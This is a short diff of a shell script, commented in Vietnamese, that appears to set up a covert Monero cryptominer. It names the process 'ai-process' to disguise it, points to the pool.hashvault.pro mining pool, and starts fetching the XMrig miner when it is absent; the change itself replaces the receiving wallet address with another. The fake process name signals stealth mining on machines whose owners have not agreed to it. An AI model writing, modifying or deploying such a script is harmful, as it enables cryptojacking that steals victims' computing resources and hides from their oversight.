@@ -4,7 +4,7 @@
 
 FAKE_NAME="ai-process"
 POOL_URL="pool.hashvault.pro:443"
-WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
+WALLET="43ZyyD81HJrhUaVYkfyV9A4pDG3AsyMmE8ATBZVQMLVW6FMszZbU28Wd35wWtcUZESeP3CAXW14cMAVYiKBtaoPCD5ZHPCj"
 # Tải XMrig nếu chưa có
 if [ ! -f "./xmrig" ]; then
     echo "[*] Đang tải XMrig..."
